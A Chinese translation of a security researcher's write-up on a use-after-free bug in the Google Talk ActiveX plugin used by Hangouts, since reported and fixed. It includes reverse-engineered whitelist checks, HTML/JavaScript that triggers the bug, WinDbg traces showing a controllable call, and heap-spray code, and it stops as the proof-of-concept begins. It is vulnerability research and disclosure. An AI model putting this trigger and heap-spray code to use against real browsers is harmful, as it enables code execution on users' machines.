译者： **xd0ol1 (知道创宇404安全实验室)**

原文链接：<http://pwnanisec.blogspot.be/2017/02/use-after-free-in-google-hangouts.html>

作者打算按ROP+shellcode的套路来实现漏洞的利用，但目前只完成了堆喷布局，代码执行部分还未完成，分析过程值得我们借鉴学习。另外，翻译不对的地方还望多多指正。

### 0x00 概述

在15年的时候，我发现Google Hangouts用到的“Google Talk ActiveX Plugin”中存在一个UAF(use-after-free)的漏洞。由于此ActiveX控件是站点锁定的，也就意味着它只能被白名单中的Google域名所调用，因此要成功利用攻击者还需要找到其中某个域名的XSS漏洞。该bug已经报告给了Google，在那之后就被修复了。

### 0x01 ActiveX控件的细节

我们在IE上安装Google Hangouts时，系统会安装“Google Talk ActiveX
Plugin”这个控件，它能被浏览器调用并且导出了下述5个方法：

    
    
    dispinterface GTalkPluginInterface {
        properties:
        methods:
            [id(0x60020000)]
            void send([in] BSTR str);
            [id(0x60020001), propput]
            void onmessage([in] VARIANT* rhs);
            [id(0x60020002), propget]
            BSTR version();
            [id(0x60020003), propget]
            BSTR wsconnectinfo();
            [id(0x60020004)]
            void wsconnectfailed([in] int port);
    };

由分析可知该控件并没有通过实现IObjectSafetySiteLock接口来将其锁定到特定域名。

    
    
     C:\Program Files (x86)\Microsoft\SiteLock 1.15>sitelist.exe {39125640-8D80-11DC-A2FE-C5C455D89593}  
     SiteList: Utility to dump domain list from a site-locked ActiveX control.  
     [1ff8] No bp log location saved, using default.  
     [000:000] [1ff8] Cpu: 6.58.9, x4, 2890Mhz, 8065MB  
     [000:000] [1ff8] Computer model: Not available  
     IObjectSafetySiteLock not implemented.  

然而，测试表明该控件仅适用于特定的Google域名。既然它没有使用IObjectSafetySiteLock，我接着又检查其是否被注册成IE中的Browser
Helper对象，这样可以获取navigation事件，通过逆向调试发现确是如此。因此，由导出的IObjectWithSite接口控件可创建与IE的连接，借此就能得到当前访问的URL信息了。

通过下述C++代码，我们创建该控件的一个实例，并在调用IObjectWithSite-> SetSite()前插入一个断点：

    
    
    #include "stdafx.h"  
    #include "windows.h"  
    #include "OCIdl.h"  
    
    int _tmain(int argc, _TCHAR* argv[])  
    {  
      CoInitialize(NULL);   
      IUnknown *punk;  
      LPGUID pclsid;  
      HRESULT hr = NULL;
      //{39125640-8D80-11DC-A2FE-C5 C4 55 D8 95 93}
      static const GUID CLSID_GTALK = { 0x39125640, 0x8D80, 0x11DC, { 0xa2, 0xfe, 0xc5, 0xc4, 0x55, 0xd8, 0x95, 0x93 } };
    
      if (FAILED(hr))  
        printf("error");  
      hr = CoCreateInstance(CLSID_GTALK, NULL, CLSCTX_SERVER, IID_IUnknown, (void **)&punk);
      if (FAILED(hr))  
        printf("error");  
    
      // Ask the ActiveX object for the IDispatch interface.  
      IObjectWithSite *pOSite;  
      hr = punk->QueryInterface(IID_IObjectWithSite, (void **)&pOSite);  
      if (FAILED(hr))  
        printf("error");  
    
      __asm  
      {  
        int 3;  
      }  
      //pOSite->GetSite(CLSID_GTALK, NULL);  
      pOSite->SetSite(NULL);  
    
      return 0;  
    }

这样我们就可以在调试器中定位到此函数的入口信息，然后在IE中的相同位置下断，并借助HTML代码来加载和调用该控件。

分析可知，控件通过对象传递来实现SetSite供IE调用，如下代码为其中的一部分实现，这里的URL信息由ECX寄存器传递：

    
    
     0:007> u 5ca85c51  
     googletalkax+0x5c51:  
     5ca85c51 51           push  ecx  
     5ca85c52 50           push  eax  
     5ca85c53 e8d88f0000   call  googletalkax!DllUnregisterServer+0x39e0 (5ca8ec30)  
     5ca85c58 8bd8         mov   ebx,eax  
     5ca85c5a 83c408       add   esp,8  
     5ca85c5d 85db         test  ebx,ebx  
     5ca85c5f 7465         je   googletalkax+0x5cc6 (5ca85cc6)  
     5ca85c61 8b4e40       mov   ecx,dword ptr [esi+40h]  
     0:007> da poi(ecx)  
     1123efc0 "http://localhost:9000/testgoogle"  
     1123efe0 "talkactivexplugin.html"  

通过对此函数的更进一步分析我们可以找到将当前域名和白名单中的域名进行比较的代码段：

    
    
     .text:5CA8CA20         cmp   [ebp+var_8], 10h  
     .text:5CA8CA24         lea   eax, [ebp+var_1C] ; holds the current domain name   
     .text:5CA8CA27         push  dword ptr [esi] ; holds whitelisted domain  
     .text:5CA8CA29         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CA2D         push  eax  
     .text:5CA8CA2E         call  sub_5CA957C0  
     .text:5CA8CA33         add   esp, 8  
     .text:5CA8CA36         test  al, al  
     .text:5CA8CA38         jnz   loc_5CA8CB37  
     .text:5CA8CA3E         add   esi, 4  
     .text:5CA8CA41         cmp   esi, offset aHostedtalkgadg ; "*hostedtalkgadget.google.com"  
     .text:5CA8CA47         jl   short loc_5CA8CA20  

我们可以在调试器中下断来打印出所有的白名单域名：

    
    
     0:005> bl  
      0 e 5ca8ca2e   0001 (0001) 0:**** googletalkax!DllUnregisterServer+0x17de "da poi(esp+4);g"  
     0:005> g  
     5cace2c4 "*hostedtalkgadget.google.com"  
     5cace2e4 "*mail.google.com"  
     5cace2f8 "*plus.google.com"  
     5cace30c "*plus.sandbox.google.com"  
     5cace328 "*talk.google.com"  
     5cace33c "*talkgadget.google.com"  

此外，下述代码为该函数中的另一条执行路径，但其需要设置控件中的“plugin_enable_corp_host”标志才能被触发，这应该是Google内部使用的，对于其它域名还需要执行额外的检测操作。

    
    
     .text:5CA8CA9F         push  offset a_corp_google_c ; "*.corp.google.com"  
     .text:5CA8CAA4         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAA8         push  eax  
     .text:5CA8CAA9         call  sub_5CA957C0  
     .text:5CA8CAAE         add   esp, 8  
     .text:5CA8CAB1         test  al, al  
     .text:5CA8CAB3         jnz   short loc_5CA8CB0C  
     .text:5CA8CAB5         cmp   [ebp+var_8], 10h  
     .text:5CA8CAB9         lea   eax, [ebp+var_1C]  
     .text:5CA8CABC         push  offset a_prod_google_c ; "*.prod.google.com"  
     .text:5CA8CAC1         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAC5         push  eax  
     .text:5CA8CAC6         call  sub_5CA957C0  
     .text:5CA8CACB         add   esp, 8  
     .text:5CA8CACE         test  al, al  
     .text:5CA8CAD0         jnz   short loc_5CA8CB0C  
     .text:5CA8CAD2         cmp   [ebp+var_8], 10h  
     .text:5CA8CAD6         lea   eax, [ebp+var_1C]  
     .text:5CA8CAD9         push  offset a_googlegoro_co ; "*.googlegoro.com"  
     .text:5CA8CADE         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAE2         push  eax  
     .text:5CA8CAE3         call  sub_5CA957C0  
     .text:5CA8CAE8         add   esp, 8  
     .text:5CA8CAEB         test  al, al  
     .text:5CA8CAED         jnz   short loc_5CA8CB0C  
     .text:5CA8CAEF         cmp   [ebp+var_8], 10h  
     .text:5CA8CAF3         lea   eax, [ebp+var_1C]  
     .text:5CA8CAF6         push  offset a_googleplex_co ; "*.googleplex.com"  
     .text:5CA8CAFB         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAFF         push  eax  
     .text:5CA8CB00         call  sub_5CA957C0  

其中，corp.google.com和googleplex.com域名会返回登录提示，似乎仅供Google员工使用，而prod.google.com域名则无法访问，很可能只是内部使用的。

### 0x02 如何触发漏洞

继续，我们知道赋值给“onmessage”导出方法的变量需为JavaScript回调函数，且它会立即被控件所调用，这可以通过下述代码进行验证：

    
    
     <html>  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     <script>  
     sdr.onmessage = sdrcallback;  
     function sdrcallback(){  
          alert("callback function is called");  
     }  
     </script>  
     </html>  

如果控件在调用回调函数前没有事先调用AddRef()函数，那么就可能出现use-after-free的情况，因为回调函数不会改变此控件在垃圾回收机制中的引用计数。

我们通过创建一个删除控件的回调函数来复现此漏洞场景：

    
    
     <html>  
     <div id="seandiv">  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     </div>  
     <script>  
     sdr.onmessage = sdrcallback;  
     function sdrcallback(){  
          alert("callback function is called");  
          //delete div  
          this.document.getElementById("seandiv").innerHTML = "";  
          CollectGarbage();  
          CollectGarbage();  
          CollectGarbage();  
     }  
     </script>  
     <body>  
     sdr  
     </body>  
     bp OLEAUT32!DispCallFunc "u poi(poi(poi(esp+4))+(poi(esp+8))) L1;gc"  
     </html>  

最终调试器会返回如下的崩溃信息：

    
    
     (13b4.24a8): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\Sean\AppData\Local\Google\Google Talk Plugin\googletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=0aabe8b7 edx=00161078 esi=00000000 edi=407a2fb0  
     eip=13e70ca5 esp=0a13c1b8 ebp=0a13c2cc iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:407a2fcc=????????  

其中EDI寄存器指向的是一块无效的内存空间：

    
    
     0:008> r  
     eax=00000001 ebx=00000001 ecx=0aabe8b7 edx=00161078 esi=00000000 edi=407a2fb0  
     eip=13e70ca5 esp=0a13c1b8 ebp=0a13c2cc iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:407a2fcc=????????  
     0:008> dd edi  
     407a2fb0 ???????? ???????? ???????? ????????  
     407a2fc0 ???????? ???????? ???????? ????????  
     407a2fd0 ???????? ???????? ???????? ????????  
     407a2fe0 ???????? ???????? ???????? ????????  
     407a2ff0 ???????? ???????? ???????? ????????  
     407a3000 ???????? ???????? ???????? ????????  
     407a3010 ???????? ???????? ???????? ????????  
     407a3020 ???????? ???????? ???????? ????????  

进一步分析可知这是一块释放掉的内存：

    
    
     0:008> !heap -p -a edi  
       address 407a2fb0 found in  
       _DPH_HEAP_ROOT @ 161000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       40751ccc:     407a2000       2000  
       51f990b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       13e88310 googletalkax!DllUnregisterServer+0x0001d9f0  
       13e6e407 googletalkax!DllUnregisterServer+0x00003ae7  
       13e6218a googletalkax+0x0000218a  
       13e6572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect<-1073475584>+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x000001ce  

### 0x03 测试漏洞的可利用性

接着我们来测试此漏洞的可利用性，这里需要把上述释放掉的内存块替换成新分配的内存空间，然后查看程序的运行过程中能否导致可控的代码执行，主要借助的是[.dvalloc](https://msdn.microsoft.com/en-us/library/windows/hardware/ff562434%28v=vs.85%29.aspx)命令。

通过查看下述代码，我们发现其中存在一条能导致代码执行的路径。首先，EDI+1Ch指向的内存值被存入到EAX寄存器，而后EAX指向的内存值又被赋值给了ESI寄存器，再往下程序会执行一些其它操作和函数调用并最终来到ESI+4指向的地址。

    
    
     13e70ca5 8b471c        mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30          mov   esi,dword ptr [eax] ds:002b:00000000=????????  
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50            push  eax  
     13e70cb1 8d45e4        lea   eax,[ebp-1Ch]  
     13e70cb4 50            push  eax  
     13e70cb5 e8768e0000    call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c        mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408        add   esp,8  
     13e70cc0 50            push  eax  
     13e70cc1 ff5604        call  dword ptr [esi+4]  

我们需要确保13e70cb5处的函数调用不会改变ESI寄存器的值，这样上面找到的执行路径才是可控的。下述的WinDbg调试过程给出了如何分配新的内存空间来替换释放掉的内存块，并通过单步跟踪来确认此路径能导致代码的执行。

    
    
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\Sean\AppData\Local\Google\Google Talk Plugin\googletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=111e2fb0  
     eip=59d80ca5 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00010246  
     googletalkax!DllUnregisterServer+0x6385:  
     59d80ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:111e2fcc=????????  
     0:008> .dvalloc 2000h  
     Allocated 2000 bytes starting at 0c690000  
     0:008> r @edi = 0c690000  
     0:008> dd edi+1c  
     0c69001c 00000000 00000000 00000000 00000000  
     0c69002c 00000000 00000000 00000000 00000000  
     0c69003c 00000000 00000000 00000000 00000000  
     0c69004c 00000000 00000000 00000000 00000000  
     0c69005c 00000000 00000000 00000000 00000000  
     0c69006c 00000000 00000000 00000000 00000000  
     0c69007c 00000000 00000000 00000000 00000000  
     0c69008c 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=00000000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80ca8 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6388:  
     59d80ca8 8b30      mov   esi,dword ptr [eax] ds:002b:00000000=????????  
     0:008> .dvalloc 200  
     Allocated 1000 bytes starting at 0cbd0000  
     0:008> r @eax = 0cbd0000  
     0:008> dd eax  
     0cbd0000 00000000 00000000 00000000 00000000  
     0cbd0010 00000000 00000000 00000000 00000000  
     0cbd0020 00000000 00000000 00000000 00000000  
     0cbd0030 00000000 00000000 00000000 00000000  
     0cbd0040 00000000 00000000 00000000 00000000  
     0cbd0050 00000000 00000000 00000000 00000000  
     0cbd0060 00000000 00000000 00000000 00000000  
     0cbd0070 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=0cbd0000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80caa esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x638a:  
     59d80caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6390:  
     59d80cb0 50       push  eax  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6391:  
     59d80cb1 8d45e4     lea   eax,[ebp-1Ch]  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb4 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6394:  
     59d80cb4 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb5 esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6395:  
     59d80cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (59d89b30)  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cba esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639a:  
     59d80cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch] ds:002b:0c69001c=00000000  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cbd esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639d:  
     59d80cbd 83c408     add   esp,8  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a0:  
     59d80cc0 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a1:  
     59d80cc1 ff5604     call  dword ptr [esi+4]  ds:002b:00000004=????????  
     0:008> p  
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  

这表明如果能在释放掉的内存块中写入我们精心构造的数据，那么就能将此漏洞转换成可利用的代码执行。

### 0x04 堆分配

我们知道该释放掉的内存块是位于堆空间上的，接下去就来看下它的分配。先在Gflags的设置中勾选“Create User Mode Stack Trace
Database”这一项，我们要能够在同一堆区上分配相同大小的内存空间，这样才能满足堆喷的利用条件，因此需要确定释放的内存是分配在哪块堆上的。

通过下述HTML代码我们可以将特定的数据分配到IE的默认堆上：

    
    
     <html>  
     <div id="seandiv">  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     </div>  
     <script>  
     function sdrcallback(){  
          alert("callback function is called");  
          //delete div  
          this.document.getElementById("seandiv").innerHTML = "";  
          CollectGarbage();  
          CollectGarbage();  
          CollectGarbage();  
          alert(sdr);  
     }  
     //javapscript heap spray to see if we are on same heap as activeX  
     var seanstring = "seansea"+"n7aaaaaaaaa"+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";  
     //s -u 0x00000000 L?0xffffffff seansean7  
     sdr.onmessage = sdrcallback;  
     </script>  
     <body></html>  

然后借助WinDbg来看下堆分配的情况：

    
    
     (1348.18dc): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\Sean\AppData\Local\Google\Google Talk Plugin\googletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=d215f8bc edx=00461078 esi=00000000 edi=3dc19fb0  
     eip=14d10ca5 esp=09b3bf10 ebp=09b3c024 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     14d10ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:3dc19fcc=????????  
     0:007> !heap -p -a edi  
       address 3dc19fb0 found in  
       _DPH_HEAP_ROOT @ 461000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       3dbe1ac4:     3dc19000       2000  
       5f8290b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       14d28310 googletalkax!DllUnregisterServer+0x0001d9f0  
       14d0e407 googletalkax!DllUnregisterServer+0x00003ae7  
       14d0218a googletalkax+0x0000218a  
       14d0572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect<-1073475584>+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x000001ce  
     0:007> s -u 0x00000000 L?0xffffffff seansean7  
     0eebafa6 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     29e66f96 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     4b6c6f02 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     79700c0a 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     0:007> !heap -p -a 0eebafa6  
       address 0eebafa6 found in  
       _DPH_HEAP_ROOT @ 461000  
       in busy allocation ( DPH_HEAP_BLOCK:     UserAddr     UserSize -     VirtAddr     VirtSize)  
                      eec0208:     eeba7f0       80c -     eeba000       2000  
       5f828e89 verifier!AVrfDebugPageHeapAllocate+0x00000229  
       77690d96 ntdll!RtlDebugAllocateHeap+0x00000030  
       7764af0d ntdll!RtlpAllocateHeap+0x000000c4  
       775f3cfe ntdll!RtlAllocateHeap+0x0000023a  
       61df38ff MSHTML!CHtmRootParseCtx::NailDownChain+0x000004ba  
       61de7c59 MSHTML!CHtmRootParseCtx::EndElement+0x00000119  
       61de7b27 MSHTML!CHtmRootParseCtxRouter::EndElement+0x00000017  
       61dee7b2 MSHTML!CHtml5TreeConstructor::PopElement+0x000000b7  
       61f896b5 MSHTML!CTextInsertionMode::DefaultEndElementHandler+0x00000035  
       620fc85b MSHTML!CInsertionMode::HandleEndElementToken+0x0000003d  
       61df17f5 MSHTML!CHtml5TreeConstructor::HandleElementTokenInInsertionMode+0x00000026  
       61df16c8 MSHTML!CHtml5TreeConstructor::PushElementToken+0x000000a5  
       61f891f8 MSHTML!CHtml5Tokenizer::EmitElementToken+0x00000067  
       61f8a243 MSHTML!CHtml5Tokenizer::RCDATAEndTagName_StateHandler+0x000003bf  
       61deeec5 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000012c  
       61def19b MSHTML!CHtml5Parse::ParseToken+0x00000131  
       61dee707 MSHTML!CHtmPost::ProcessTokens+0x000006af  
       61de7f32 MSHTML!CHtmPost::Exec+0x000001e4  
       620b9a78 MSHTML!CHtmPost::Run+0x0000003d  
       620b99de MSHTML!PostManExecute+0x00000061  
       620c1e04 MSHTML!PostManResume+0x0000007b  
       61e4d397 MSHTML!CDwnChan::OnMethodCall+0x0000003e  
       61d0e101 MSHTML!GlobalWndOnMethodCall+0x0000016d  
       61d0db16 MSHTML!GlobalWndProc+0x000002e5  
       751262fa user32!InternalCallWinProc+0x00000023  
       75126d3a user32!UserCallWinProcCheckWow+0x00000109  
       751277c4 user32!DispatchMessageWorker+0x000003bc  
       7512788a user32!DispatchMessageW+0x0000000f  
       6366f668 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464  
       636a25b8 IEFRAME!LCIETab_ThreadProc+0x0000037b  
       7531d6fc iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c  
       5f893991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094  

可以看到ActiveX控件和JavaScript代码使用了相同的堆区，因此利用起来就方便多了。

### 0x05 确定堆分配的大小

接着我们还需要确定此释放对象的大小，这里要禁用掉除了“usermode stack dbs”外所有的Gflags设置，同时还要在崩溃处下个断点：

    
    
     Bu googletalkax!DllUnregisterServer+0x6385 "!heap -p -a edi;g"
    
    
     70760ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:078f8a44=a48a8f07  
     0:005> !heap -p -a edi  
       address 078f8a28 found in  
       _HEAP @ 730000  
        HEAP_ENTRY Size Prev Flags  UserPtr UserSize - state  
         078f8a10 000d 0000 [00]  078f8a28  00050 - (busy)  
          ? googletalkax!DllUnregisterServer+43db0  

因此释放掉的对象大小为0x50字节。

### 0x06 堆喷

然后，我们利用堆喷在释放内存上重新写入想要的数据，此步骤要在与释放对象交互前完成。不过在此之前我们需要先填充IE进程中的那些堆碎片，这个过程会分配大量相同大小的堆。

我们通过下述JS函数来实现堆喷。其中，赋值的0x50字节子字符串需要减去4字节的BSTR对象头部以及2字节的终止标识，又因为存储的是Unicode格式，所以还要除以2。最终，该字符串会正好占用0x50字节的内存空间。

    
    
     var largechunk = unescape("sean3");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length < 0x10000) largechunk += largechunk;  
          for (var i = 0; i < 0x200; i++)  
          {  
               spray[i] = largechunk.substring(0,(0x50-6)/2);  
          }  
     }  

此后，我们还要用到[DEPS喷射技术](https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/)来完成一次精确布局，通过如下堆喷操作后内存0x20302228上会保存有我们的数据。

    
    
     function corelan_deps_spray()  
     {  
          var div_container = document.getElementById("corelanspraydiv");  
          div_container.style.cssText = "display:none";  
          junk = unescape("%u615d%u6161");  
          while (junk.length < 0x80000) junk += junk;  
          for (var i = 0; i < 0x500; i++)  
          {  
               var obj = document.createElement("button");  
               obj.title = junk;  
               div_container.appendChild(obj);  
          }  
     }  

### 0x07 PoC

借助所有的这些信息，我们给出如下的PoC代码，它能将程序的执行流引向我们所设定的地址：

    
    
     <html>  
     <div id="seandiv">  
     <object  
